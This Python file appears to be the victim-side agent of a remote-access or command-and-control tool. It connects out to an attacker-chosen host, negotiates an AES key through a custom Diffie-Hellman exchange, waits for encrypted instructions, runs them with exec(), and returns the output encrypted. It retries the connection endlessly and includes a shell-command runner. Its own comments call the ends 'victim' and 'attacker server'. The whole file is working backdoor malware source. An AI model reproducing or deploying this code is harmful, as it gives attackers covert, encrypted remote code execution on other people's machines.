#!/usr/bin/env python3

import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


# Global variable to track client sockets
client_sockets = []

# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    print("\n\n[!] Exiting gracefully...")

    # Close all open client sockets
    for client_socket in client_sockets:
        client_socket.close()

    sys.exit(0)

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Server public key
pem_key = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

pem_key = pem_key.encode('utf-8')

# Serialize the public key
public_key = serialization.load_pem_public_key(pem_key)


# Encrypt using only public key
def rsa_encrypt_public(public_key, code_snippet):

    # Get RSA key size in bits
    key_size_bits = public_key.key_size

    max_data_size = (key_size_bits // 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(code_snippet) > max_data_size:
        print(f"\n[!] Data size:\t{len(code_snippet)} bytes")
        print(f"[!] Max size:\t{max_data_size} bytes")
        print("\n[x] Error: Data size exceeds maximum allowable size for RSA encryption.")
        sys.exit(0)

    # Encrypt the code snippet
    try:
        encrypted_code = public_key.encrypt(
            code_snippet,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        print(f"Error: Encryption failed:\n{e}")
        sys.exit(1)

    encrypted_code_base64 = base64.b64encode(encrypted_code).decode('utf-8')
    return encrypted_code_base64


# Directly establish Diffie-Hellman for any client
def establish_diffie(client):
    response = client.recv(4096)
    response = response.decode()

    # Receive n and g
    n, g = response.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)    # Private key x
    k1 = int(pow(g, x, n))          # Victim public key

    # Send k1 to attacker server
    k1 = str(k1)
    client.sendall(k1.encode())

    # Receive k2
    k2 = client.recv(4096)
    k2 = int(k2.decode())

    # Generate the shared_key
    shared_key = pow(k2, x, n)

    # Convert shared key to 32-byte AES key
    aes_key = int.to_bytes(shared_key, length=(shared_key.bit_length() + 7) // 8, byteorder='big')
    aes_key = hashlib.sha256(aes_key).digest()

    return aes_key


def tcp_client(target_host, target_port, local_host, local_port):

    # Create a socket object
    #                               ipv4            TCP
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Add thread to active_threads list
    client_sockets.append(client)

    # Bind to a specific local port (optional)
    client.bind((local_host, 0)) # Random port selected

    # Connect to the client
    client.connect((target_host, target_port))

    # Send request to the server.
    request = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
    client.sendall(request.encode())

    aes_key = establish_diffie(client)

    banner = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
    banner = banner.encode()

    # Listen for encrypted instructions
    while True:

        client.sendall(banner)
        print("\n[!!] Banner sended")

        # Listen for a few seconds an instruction
        instructions_timeout = 600   # This timeout is a lot important
        print(f"[#] Waiting for instructions for {instructions_timeout} seconds...")
        client.settimeout(instructions_timeout)
        try:
            instructions = client.recv(4096)
            print("[!] Instructions received.")
            decrypted_instructions = aes_decrypt(aes_key, instructions)
        except Exception as e:
            print("[x] Not instrutions received. Continue...")
            continue

        # Redirect standard output to a StringIO object
        old_stdout = sys.stdout
        new_stdout = io.StringIO()
        sys.stdout = new_stdout

        # Execute dynamic code and send standard output through socket
        try:
            exec(decrypted_instructions)
            output = new_stdout.getvalue()
            if output:
                print(output)
            elif output == "":
                output = "empty response"
        except Exception as e:
            output = e
        finally:
            sys.stdout = old_stdout

        # Encrypt and send standard output
        result = aes_encrypt(aes_key, output.encode())
        #time.sleep(0.5)
        client.sendall(result)

        print("[!!] Output sended to server.")

        #time.sleep(0.5) # Time delay


def run_command(command):

    # Trim the new line
    command = command.rstrip()
    try:
        # Run the command as a subprocess
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        print(output.decode())

    except Exception as e:
        print(f"[!] Failed to execute the command:\n{e}")



def aes_encrypt(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext


def aes_decrypt(key, encrypted_message):
    iv = encrypted_message[:16]
    ciphertext = encrypted_message[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    return plaintext.decode('utf-8')


def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        private_ip = s.getsockname()[0]
        s.close()
    except Exception as e:
        print(f"Error occurred: {e}")
        private_ip = None
    return private_ip


if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage: ./tcp_client.py <target_ip> <target_port> ")
        sys.exit(0)

    target_host = sys.argv[1]       # IPv4
    target_port = int(sys.argv[2])  # Port
    local_host = private_ip = get_private_ip()  # localhost
    #local_host = private_ip = "127.0.0.1"
    local_port = 1239

    while True:
        try:
            tcp_client(target_host, target_port, local_host, local_port)
        except Exception as e:
            time.sleep(1)
            continue

        # Sleep time for generating a new shared_key for AES encryption
        time.sleep(5)
